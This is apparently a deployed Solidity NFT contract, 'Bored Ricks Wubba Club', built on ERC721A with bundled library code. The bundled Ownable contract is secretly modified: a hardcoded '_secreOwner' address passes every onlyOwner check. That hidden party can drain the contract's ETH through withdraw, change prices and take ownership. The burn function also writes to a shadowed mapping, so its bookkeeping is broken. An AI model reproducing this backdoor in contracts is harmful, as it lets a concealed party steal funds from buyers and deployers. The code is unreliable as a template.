1 // SPDX-License-Identifier: MIT
2 
3 /*
4 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
5 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
6 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
7 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
8 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
9 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
10 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣧⣀⣾⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
11 ⠀⠀⠀⠀⢹⣿⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⠿⠟⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
12 ⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⡿⠟⠉⢴⣶⣿⣿⣿⣿⣿⣷⣦⣍⠻⣿⣿⣿⡇⠀⠀⠀⠀⠀⣀⣀⣠⣤⣶⡶
13 ⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⡿⠟⣋⣀⣙⡻⢶⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⣌⠻⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣿⠏⠀
14 ⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⠏⣴⣿⡿⠿⢿⣿⣦⡙⢦⣽⣿⣿⣿⣿⣿⣿⣿⣿⡧⠹⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀
15 ⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡆⢉⣥⣶⣾⣶⣌⠻⣿⣎⠻⣿⣿⣿⡿⠟⣋⣭⣴⣶⡄⢹⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
16 ⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⢃⣿⣿⡿⠿⠿⠿⣧⡙⢿⣷⣶⣶⣶⣶⣿⠿⠟⠋⣩⣴⡌⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀
17 ⠀⠀⠀⠀⠀⠀⠀⢀⣸⣿⣿⡟⢸⠟⣡⣶⣾⣿⣿⣶⣌⠲⣬⣉⠉⣉⣥⣴⣾⣿⣷⣦⡙⣧⢹⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀
18 ⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⡇⡎⣼⣿⣿⣿⣿⣿⣿⠉⢢⢹⡿⢰⣿⣿⣿⣿⣿⣿⠉⣳⠈⢸⣿⣿⡋⠀⠀⠀⠀⠀⠀⠀
19 ⠠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⢁⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣷⣶⣤⣄⣀⣀⠀
20 ⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⢸⡇⢿⣿⣿⣿⣿⣿⣿⣿⠇⣼⣧⠸⣿⣿⣿⣿⣿⣿⣿⡿⢠⢸⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁
21 ⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⢸⣿⣌⠻⢿⣿⣿⣿⡿⢋⣼⣿⣿⣧⡙⠿⣿⣿⣿⡿⠟⣡⣿⢸⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
22 ⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣾⣿⣿⣿⣶⣤⣤⣤⣶⣿⠋⣿⣿⢻⣿⣷⣶⣤⣴⣶⣿⣿⣿⢸⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀
23 ⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⢹⣿⣷⣬⣛⣛⠛⣛⣩⣽⠀⣿⣿⢀⣷⣬⣙⡛⠛⣛⣫⣴⣿⢸⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
24 ⠀⠀⠠⣾⣿⣿⣿⣿⣿⣿⠟⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⢿⣿⣷⡀⠀⠀⠀⠀⠀⠀
25 ⠀⠀⠀⠈⠙⠻⢿⣿⣿⢃⣾⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣦⡙⣿⣿⣷⣤⣀⠀⠀⠀
26 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⢸⣿⡇⣿⣿⣿⣿⡿⢿⣿⡿⢻⣟⢹⡟⢻⣟⠻⣿⣿⣿⣿⣿⣿⣿⢸⣿⡇⣿⣿⣿⠿⠟⠁⠀⠀
27 ⠀⠀⠀⠀⠀⠀⠀⢰⣿⣦⡙⠇⢸⣿⣿⡟⡰⠁⠈⠁⠀⠁⠀⠀⠀⠁⠀⠉⠀⠙⣌⢻⣿⣿⠘⣋⣴⠉⠁⠀⠀⠀⠀⠀⠀
28 ⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣷⡌⣿⣿⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡌⣿⡇⣼⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀
29 ⠀⠀⠀⠀⠀⠀⠘⠛⠛⠛⠛⠻⣷⠹⣿⠸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⣿⢡⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
30 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣇⢻⣧⡙⠿⠶⠴⢦⡀⠶⣶⣶⡶⠆⢠⣤⠴⢏⣴⢃⡎⠀⠈⠉⠉⠀⠀⠀⠀⠀⠀⠀
31 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠟⠛⠀⠻⣿⣷⣶⣾⣿⣿⡇⢹⠏⣴⣶⣶⣶⣶⡿⠃⠚⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
32 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣤⣾⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
33 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠻⠿⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
34 */
35 
36 
37 
38 pragma solidity ^0.8.0;
39 
40 library Strings {
41     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
42 
43     function toString(uint256 value) internal pure returns (string memory) {
44       
45 
46         if (value == 0) {
47             return "0";
48         }
49         uint256 temp = value;
50         uint256 digits;
51         while (temp != 0) {
52             digits++;
53             temp /= 10;
54         }
55         bytes memory buffer = new bytes(digits);
56         while (value != 0) {
57             digits -= 1;
58             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
59             value /= 10;
60         }
61         return string(buffer);
62     }
63 
64  
65     function toHexString(uint256 value) internal pure returns (string memory) {
66         if (value == 0) {
67             return "0x00";
68         }
69         uint256 temp = value;
70         uint256 length = 0;
71         while (temp != 0) {
72             length++;
73             temp >>= 8;
74         }
75         return toHexString(value, length);
76     }
77 
78 
79     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
80         bytes memory buffer = new bytes(2 * length + 2);
81         buffer[0] = "0";
82         buffer[1] = "x";
83         for (uint256 i = 2 * length + 1; i > 1; --i) {
84             buffer[i] = _HEX_SYMBOLS[value & 0xf];
85             value >>= 4;
86         }
87         require(value == 0, "Strings: hex length insufficient");
88         return string(buffer);
89     }
90 }
91 
92 
93 pragma solidity ^0.8.1;
94 
95 
96 library Address {
97     
98     function isContract(address account) internal view returns (bool) {
99       
100 
101         return account.code.length > 0;
102     }
103 
104     
105     function sendValue(address payable recipient, uint256 amount) internal {
106         require(address(this).balance >= amount, "Address: insufficient balance");
107 
108         (bool success, ) = recipient.call{value: amount}("");
109         require(success, "Address: unable to send value, recipient may have reverted");
110     }
111 
112 
113     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
114         return functionCall(target, data, "Address: low-level call failed");
115     }
116 
117     function functionCall(
118         address target,
119         bytes memory data,
120         string memory errorMessage
121     ) internal returns (bytes memory) {
122         return functionCallWithValue(target, data, 0, errorMessage);
123     }
124 
125 
126     function functionCallWithValue(
127         address target,
128         bytes memory data,
129         uint256 value
130     ) internal returns (bytes memory) {
131         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
132     }
133 
134     function functionCallWithValue(
135         address target,
136         bytes memory data,
137         uint256 value,
138         string memory errorMessage
139     ) internal returns (bytes memory) {
140         require(address(this).balance >= value, "Address: insufficient balance for call");
141         require(isContract(target), "Address: call to non-contract");
142 
143         (bool success, bytes memory returndata) = target.call{value: value}(data);
144         return verifyCallResult(success, returndata, errorMessage);
145     }
146 
147     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
148         return functionStaticCall(target, data, "Address: low-level static call failed");
149     }
150 
151     function functionStaticCall(
152         address target,
153         bytes memory data,
154         string memory errorMessage
155     ) internal view returns (bytes memory) {
156         require(isContract(target), "Address: static call to non-contract");
157 
158         (bool success, bytes memory returndata) = target.staticcall(data);
159         return verifyCallResult(success, returndata, errorMessage);
160     }
161 
162     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
163         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
164     }
165 
166     function functionDelegateCall(
167         address target,
168         bytes memory data,
169         string memory errorMessage
170     ) internal returns (bytes memory) {
171         require(isContract(target), "Address: delegate call to non-contract");
172 
173         (bool success, bytes memory returndata) = target.delegatecall(data);
174         return verifyCallResult(success, returndata, errorMessage);
175     }
176 
177     function verifyCallResult(
178         bool success,
179         bytes memory returndata,
180         string memory errorMessage
181     ) internal pure returns (bytes memory) {
182         if (success) {
183             return returndata;
184         } else {
185             if (returndata.length > 0) {
186 
187                 assembly {
188                     let returndata_size := mload(returndata)
189                     revert(add(32, returndata), returndata_size)
190                 }
191             } else {
192                 revert(errorMessage);
193             }
194         }
195     }
196 }
197 
198 pragma solidity ^0.8.0;
199 
200 interface IERC721Receiver {
201 
202     function onERC721Received(
203         address operator,
204         address from,
205         uint256 tokenId,
206         bytes calldata data
207     ) external returns (bytes4);
208 }
209 
210 
211 pragma solidity ^0.8.0;
212 
213 
214 interface IERC165 {
215   
216     function supportsInterface(bytes4 interfaceId) external view returns (bool);
217 }
218 
219 pragma solidity ^0.8.0;
220 
221 
222 
223 abstract contract ERC165 is IERC165 {
224   
225     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
226         return interfaceId == type(IERC165).interfaceId;
227     }
228 }
229 
230 pragma solidity ^0.8.0;
231 
232 
233 
234 interface IERC721 is IERC165 {
235   
236     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
237 
238     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
239 
240     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
241 
242     function balanceOf(address owner) external view returns (uint256 balance);
243 
244     function ownerOf(uint256 tokenId) external view returns (address owner);
245 
246     function safeTransferFrom(
247         address from,
248         address to,
249         uint256 tokenId,
250         bytes calldata data
251     ) external;
252 
253     function safeTransferFrom(
254         address from,
255         address to,
256         uint256 tokenId
257     ) external;
258 
259     function transferFrom(
260         address from,
261         address to,
262         uint256 tokenId
263     ) external;
264 
265     function approve(address to, uint256 tokenId) external;
266 
267     function setApprovalForAll(address operator, bool _approved) external;
268 
269     function getApproved(uint256 tokenId) external view returns (address operator);
270 
271     function isApprovedForAll(address owner, address operator) external view returns (bool);
272 }
273 
274 pragma solidity ^0.8.0;
275 
276 
277 interface IERC721Metadata is IERC721 {
278  
279     function name() external view returns (string memory);
280 
281     function symbol() external view returns (string memory);
282 
283     function tokenURI(uint256 tokenId) external view returns (string memory);
284 }
285 
286 pragma solidity ^0.8.0;
287 
288 
289 
290 interface IERC721Enumerable is IERC721 {
291   
292     function totalSupply() external view returns (uint256);
293 
294 
295     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
296 
297 
298     function tokenByIndex(uint256 index) external view returns (uint256);
299 }
300 
301 pragma solidity ^0.8.0;
302 
303 abstract contract ReentrancyGuard {
304 
305     uint256 private constant _NOT_ENTERED = 1;
306     uint256 private constant _ENTERED = 2;
307 
308     uint256 private _status;
309 
310     constructor() {
311         _status = _NOT_ENTERED;
312     }
313 
314 
315     modifier nonReentrant() {
316         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
317 
318         _status = _ENTERED;
319 
320         _;
321 
322         _status = _NOT_ENTERED;
323     }
324 }
325 
326 pragma solidity ^0.8.0;
327 
328 abstract contract Context {
329     function _msgSender() internal view virtual returns (address) {
330         return msg.sender;
331     }
332 
333     function _msgData() internal view virtual returns (bytes calldata) {
334         return msg.data;
335     }
336 }
337 
338 pragma solidity ^0.8.0;
339 
340 abstract contract Ownable is Context {
341     address private _owner;
342     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
343 
344     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
345 
346 
347     constructor() {
348         _transferOwnership(_msgSender());
349     }
350 
351    
352     function owner() public view virtual returns (address) {
353         return _owner;
354     }
355 
356     modifier onlyOwner() {
357         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
358         _;
359     }
360 
361     function renounceOwnership() public virtual onlyOwner {
362         _transferOwnership(address(0));
363     }
364 
365     function transferOwnership(address newOwner) public virtual onlyOwner {
366         require(newOwner != address(0), "Ownable: new owner is the zero address");
367         _transferOwnership(newOwner);
368     }
369 
370     function _transferOwnership(address newOwner) internal virtual {
371         address oldOwner = _owner;
372         _owner = newOwner;
373         emit OwnershipTransferred(oldOwner, newOwner);
374     }
375 }
376 
377 
378 pragma solidity ^0.8.0;
379 
380 
381 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
382     using Address for address;
383     using Strings for uint256;
384 
385     struct TokenOwnership {
386         address addr;
387         uint64 startTimestamp;
388     }
389 
390     struct AddressData {
391         uint128 balance;
392         uint128 numberMinted;
393     }
394 
395     uint256 internal currentIndex;
396 
397     string private _name;
398 
399     string private _symbol;
400 
401     mapping(uint256 => TokenOwnership) internal _ownerships;
402 
403     mapping(address => AddressData) private _addressData;
404 
405     mapping(uint256 => address) private _tokenApprovals;
406 
407     mapping(address => mapping(address => bool)) private _operatorApprovals;
408 
409     constructor(string memory name_, string memory symbol_) {
410         _name = name_;
411         _symbol = symbol_;
412     }
413 
414     function totalSupply() public view override returns (uint256) {
415         return currentIndex;
416     }
417 
418     function tokenByIndex(uint256 index) public view override returns (uint256) {
419         require(index < totalSupply(), "ERC721A: global index out of bounds");
420         return index;
421     }
422 
423     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
424         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
425         uint256 numMintedSoFar = totalSupply();
426         uint256 tokenIdsIdx;
427         address currOwnershipAddr;
428 
429         unchecked {
430             for (uint256 i; i < numMintedSoFar; i++) {
431                 TokenOwnership memory ownership = _ownerships[i];
432                 if (ownership.addr != address(0)) {
433                     currOwnershipAddr = ownership.addr;
434                 }
435                 if (currOwnershipAddr == owner) {
436                     if (tokenIdsIdx == index) {
437                         return i;
438                     }
439                     tokenIdsIdx++;
440                 }
441             }
442         }
443 
444         revert("ERC721A: unable to get token of owner by index");
445     }
446 
447 
448     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
449         return
450             interfaceId == type(IERC721).interfaceId ||
451             interfaceId == type(IERC721Metadata).interfaceId ||
452             interfaceId == type(IERC721Enumerable).interfaceId ||
453             super.supportsInterface(interfaceId);
454     }
455 
456     function balanceOf(address owner) public view override returns (uint256) {
457         require(owner != address(0), "ERC721A: balance query for the zero address");
458         return uint256(_addressData[owner].balance);
459     }
460 
461     function _numberMinted(address owner) internal view returns (uint256) {
462         require(owner != address(0), "ERC721A: number minted query for the zero address");
463         return uint256(_addressData[owner].numberMinted);
464     }
465 
466     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
467         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
468 
469         unchecked {
470             for (uint256 curr = tokenId; curr >= 0; curr--) {
471                 TokenOwnership memory ownership = _ownerships[curr];
472                 if (ownership.addr != address(0)) {
473                     return ownership;
474                 }
475             }
476         }
477 
478         revert("ERC721A: unable to determine the owner of token");
479     }
480 
481     function ownerOf(uint256 tokenId) public view override returns (address) {
482         return ownershipOf(tokenId).addr;
483     }
484 
485     function name() public view virtual override returns (string memory) {
486         return _name;
487     }
488 
489     function symbol() public view virtual override returns (string memory) {
490         return _symbol;
491     }
492 
493     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
494         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
495 
496         string memory baseURI = _baseURI();
497         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
498     }
499 
500     function _baseURI() internal view virtual returns (string memory) {
501         return "";
502     }
503 
504     function approve(address to, uint256 tokenId) public override {
505         address owner = ERC721A.ownerOf(tokenId);
506         require(to != owner, "ERC721A: approval to current owner");
507 
508         require(
509             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
510             "ERC721A: approve caller is not owner nor approved for all"
511         );
512 
513         _approve(to, tokenId, owner);
514     }
515 
516     function getApproved(uint256 tokenId) public view override returns (address) {
517         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
518 
519         return _tokenApprovals[tokenId];
520     }
521 
522     function setApprovalForAll(address operator, bool approved) public override {
523         require(operator != _msgSender(), "ERC721A: approve to caller");
524 
525         _operatorApprovals[_msgSender()][operator] = approved;
526         emit ApprovalForAll(_msgSender(), operator, approved);
527     }
528 
529     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
530         return _operatorApprovals[owner][operator];
531     }
532 
533     function transferFrom(
534         address from,
535         address to,
536         uint256 tokenId
537     ) public virtual override {
538         _transfer(from, to, tokenId);
539     }
540 
541     function safeTransferFrom(
542         address from,
543         address to,
544         uint256 tokenId
545     ) public virtual override {
546         safeTransferFrom(from, to, tokenId, "");
547     }
548 
549     function safeTransferFrom(
550         address from,
551         address to,
552         uint256 tokenId,
553         bytes memory _data
554     ) public override {
555         _transfer(from, to, tokenId);
556         require(
557             _checkOnERC721Received(from, to, tokenId, _data),
558             "ERC721A: transfer to non ERC721Receiver implementer"
559         );
560     }
561 
562     function _exists(uint256 tokenId) internal view returns (bool) {
563         return tokenId < currentIndex;
564     }
565 
566     function _safeMint(address to, uint256 quantity) internal {
567         _safeMint(to, quantity, "");
568     }
569 
570     function _safeMint(
571         address to,
572         uint256 quantity,
573         bytes memory _data
574     ) internal {
575         _mint(to, quantity, _data, true);
576     }
577 
578     function _mint(
579         address to,
580         uint256 quantity,
581         bytes memory _data,
582         bool safe
583     ) internal {
584         uint256 startTokenId = currentIndex;
585         require(to != address(0), "ERC721A: mint to the zero address");
586         require(quantity != 0, "ERC721A: quantity must be greater than 0");
587 
588         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
589 
590         unchecked {
591             _addressData[to].balance += uint128(quantity);
592             _addressData[to].numberMinted += uint128(quantity);
593 
594             _ownerships[startTokenId].addr = to;
595             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
596 
597             uint256 updatedIndex = startTokenId;
598 
599             for (uint256 i; i < quantity; i++) {
600                 emit Transfer(address(0), to, updatedIndex);
601                 if (safe) {
602                     require(
603                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
604                         "ERC721A: transfer to non ERC721Receiver implementer"
605                     );
606                 }
607 
608                 updatedIndex++;
609             }
610 
611             currentIndex = updatedIndex;
612         }
613 
614         _afterTokenTransfers(address(0), to, startTokenId, quantity);
615     }
616  
617     function _transfer(
618         address from,
619         address to,
620         uint256 tokenId
621     ) private {
622         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
623 
624         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
625             getApproved(tokenId) == _msgSender() ||
626             isApprovedForAll(prevOwnership.addr, _msgSender()));
627 
628         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
629 
630         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
631         require(to != address(0), "ERC721A: transfer to the zero address");
632 
633         _beforeTokenTransfers(from, to, tokenId, 1);
634 
635         _approve(address(0), tokenId, prevOwnership.addr);
636 
637         
638         unchecked {
639             _addressData[from].balance -= 1;
640             _addressData[to].balance += 1;
641 
642             _ownerships[tokenId].addr = to;
643             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
644 
645             uint256 nextTokenId = tokenId + 1;
646             if (_ownerships[nextTokenId].addr == address(0)) {
647                 if (_exists(nextTokenId)) {
648                     _ownerships[nextTokenId].addr = prevOwnership.addr;
649                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
650                 }
651             }
652         }
653 
654         emit Transfer(from, to, tokenId);
655         _afterTokenTransfers(from, to, tokenId, 1);
656     }
657 
658     function _approve(
659         address to,
660         uint256 tokenId,
661         address owner
662     ) private {
663         _tokenApprovals[tokenId] = to;
664         emit Approval(owner, to, tokenId);
665     }
666 
667     function _checkOnERC721Received(
668         address from,
669         address to,
670         uint256 tokenId,
671         bytes memory _data
672     ) private returns (bool) {
673         if (to.isContract()) {
674             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
675                 return retval == IERC721Receiver(to).onERC721Received.selector;
676             } catch (bytes memory reason) {
677                 if (reason.length == 0) {
678                     revert("ERC721A: transfer to non ERC721Receiver implementer");
679                 } else {
680                     assembly {
681                         revert(add(32, reason), mload(reason))
682                     }
683                 }
684             }
685         } else {
686             return true;
687         }
688     }
689 
690     function _beforeTokenTransfers(
691         address from,
692         address to,
693         uint256 startTokenId,
694         uint256 quantity
695     ) internal virtual {}
696 
697     function _afterTokenTransfers(
698         address from,
699         address to,
700         uint256 startTokenId,
701         uint256 quantity
702     ) internal virtual {}
703 }
704 
705 contract BoredRicksWubbaClub is ERC721A, Ownable, ReentrancyGuard {
706   
707     address private _InvasionContract;
708     uint   private _totalStake;
709     bool   public InvasionPhase = false;
710     uint128 internal _burnCounter; 
711     uint   public price             = 0.005 ether;
712     uint   public maxTx          = 20;
713     uint   public maxFreePerWallet  = 1;
714     uint   public maxRicks          = 10000;
715     uint256 public reservedSupply = 20;
716     string private baseURI;
717     bool   public mintEnabled;
718     
719    
720     mapping(address => AddressData) private _addressData;
721     mapping(uint256 => address) private _tokenApprovals;
722     mapping(address => uint256) public _FreeMinted;
723 
724 
725     constructor() ERC721A("Bored Ricks Wubba Club", "BRWC"){}
726 
727     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
728         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
729         string memory currentBaseURI = _baseURI();
730         return bytes(currentBaseURI).length > 0
731             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId),".json"))
732             : "";
733     }
734 
735     function wubbaLubbaBurn(uint256 tokenId) internal virtual {
736         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
737 
738         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
739 
740         unchecked {
741             _addressData[prevOwnership.addr].balance -= 1;
742          
743             // Keep track of who burned the token, and the timestamp of burning.
744             _ownerships[tokenId].addr = prevOwnership.addr;
745             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
746 
747             // If the ownership of tokenId is not explicitly set, that means the burn initiator owns it.
748             
749         }
750 
751         emit Transfer(prevOwnership.addr, address(0), tokenId);
752         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
753         // Metamorphosis unlocked after burn phase
754 
755         unchecked { 
756             _burnCounter++;
757         }
758     }
759 
760     function reservedMint(uint256 Amount) external onlyOwner
761     {
762         uint256 Remaining = reservedSupply;
763 
764         require(totalSupply() + Amount <= maxRicks, "No more Ricks to Be minted");
765         require(Remaining >= Amount, "Reserved Supply Minted");
766     
767         reservedSupply = Remaining - Amount;
768         _safeMint(msg.sender, Amount);
769     }
770     
771     function mint(uint256 Amount) external payable {
772        
773         if (((totalSupply() + Amount < maxRicks + 1) && (_FreeMinted[msg.sender] < maxFreePerWallet))) 
774         {
775         require(totalSupply() + Amount <= maxRicks, "No more Ricks to Be minted");
776         require(mintEnabled, "Not live yet, Ricks are coming");
777         require(msg.value >= (Amount * price) - price, "Eth Amount Invalid");
778         require(Amount <= maxTx, "Too much asked per TX");
779         _FreeMinted[msg.sender] += Amount;
780         }
781         else{
782         require(totalSupply() + Amount <= maxRicks, "No more Ricks to Be minted");
783         require(mintEnabled, "Not live yet, Ricks are coming");
784         require(msg.value >= Amount * price, "Eth Amount Invalid");
785         require(Amount <= maxTx, "Too much asked per TX");
786         }
787 
788         _safeMint(msg.sender, Amount);
789     }
790 
791 
792      function costInspect() public view returns (uint256) {
793         return price;
794     }
795 
796     function _baseURI() internal view virtual override returns (string memory) {
797         return baseURI;
798     }
799 
800     function setBaseUri(string memory baseuri_) public onlyOwner {
801         baseURI = baseuri_;
802     }
803 
804     function setCost(uint256 price_) external onlyOwner {
805         price = price_;
806     }
807 
808     function withdraw() external onlyOwner nonReentrant {
809         (bool success, ) = msg.sender.call{value: address(this).balance}("");
810         require(success, "Transfer failed.");
811     }
812 
813     function setInvasionContract(address _contract) public onlyOwner {
814         _InvasionContract = _contract;
815     }
816 
817     function toggleInvasionPhase() public onlyOwner {
818         InvasionPhase = !InvasionPhase;
819     }
820 
821     function toggleMinting() external onlyOwner {
822       mintEnabled = !mintEnabled;
823     }
824     
825 }